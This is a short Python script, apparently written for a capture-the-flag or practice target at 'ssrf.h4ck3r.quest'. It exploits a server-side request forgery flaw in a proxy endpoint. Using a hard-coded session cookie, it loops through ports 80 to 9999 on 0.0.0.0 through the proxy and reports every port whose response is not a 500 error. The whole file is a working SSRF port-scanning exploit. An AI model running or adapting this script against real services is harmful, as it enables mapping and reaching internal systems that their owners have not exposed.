from requests import get

cookies = {
    "session": "!eKuPgGbEq+zhkqpHLa3rGA==?gAWVCQIAAAAAAACMB3Nlc3Npb26UfZSMCHBheWxvYWRzlF2UKIwTaHR0cHM6Ly9leGFtcGxlLmNvbZSMEWh0dHA6Ly9nb29nbGUuY29tlIwTaHR0cHM6Ly9leGFtcGxlLmNvbZSME2h0dHBzOi8vZXhhbXBsZS5jb22UjBM8aDE+aGVsbG93b3JsZDwvaDE+lIwTaHR0cHM6Ly9leGFtcGxlLmNvbZSMEWh0dHBzOi8vMTI3LjAuMC4xlIwIaHR0cDovLzCUjAhodHRwOi8vMJSMCGh0dHA6Ly8wlIwRaHR0cDovLzAuMC4wLjA6ODCUjBNodHRwOi8vMC4wLjAuMDo5MDAwlIwTaHR0cDovLzAuMC4wLjA6ODg4OJSME2h0dHA6Ly8wLjAuMC4wOjgwODCUjBFodHRwOi8vMC4wLjAuMDo4MJSMEWh0dHA6Ly8wLjAuMC4wOjgwlIwRaHR0cDovLzAuMC4wLjA6ODCUjBFodHRwOi8vMC4wLjAuMDo4MJSMEWh0dHA6Ly8wLjAuMC4wOjgwlIwRaHR0cDovLzAuMC4wLjA6ODCUjBFodHRwOi8vMC4wLjAuMDo4MJSMEWh0dHA6Ly8wLjAuMC4wOjgwlIwRaHR0cDovLzAuMC4wLjA6ODCUjBJodHRwOi8vMC4wLjAuMDo0NDOUjBFodHRwOi8vMC4wLjAuMDo4MJRlc4aULg=="
}

for i in range(80, 10000, 1):
    payload = "https://ssrf.h4ck3r.quest/proxy?url=http://0.0.0.0:"+str(i)

    data = get(payload, cookies=cookies)

    # print(data.status_code, payload)
    # print(data.text)

    if data.status_code != 500:
        print("Found Something: [" + str(data.status_code) + "] " + str(i))

